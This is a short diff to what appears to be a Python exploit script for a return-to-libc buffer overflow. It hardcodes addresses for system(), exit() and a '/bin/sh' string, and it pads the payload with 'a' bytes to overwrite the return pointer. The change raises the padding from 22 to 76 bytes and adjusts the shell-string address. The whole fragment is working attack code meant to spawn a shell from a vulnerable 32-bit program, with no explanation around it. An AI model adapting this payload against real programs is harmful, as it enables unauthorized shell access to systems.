@@ -13,12 +13,12 @@ SYSTEM_ADDR =  "\xe0\x03\xe5\xb7"
 EXIT_ADDR   =  "\xb0\x31\xe4\xb7"
 
 #address of SHELL = "/bin/sh"
-BASH_STRING =  "\x19\xf7\xff\xbf"
+BASH_STRING =  "\x18\xf9\xff\xbf"
 
 #trash until stop in the EIP 
 
 
-buffer = "a"* 22
+buffer = "a"* 76
 
 buffer = buffer + SYSTEM_ADDR + EXIT_ADDR + BASH_STRING
 
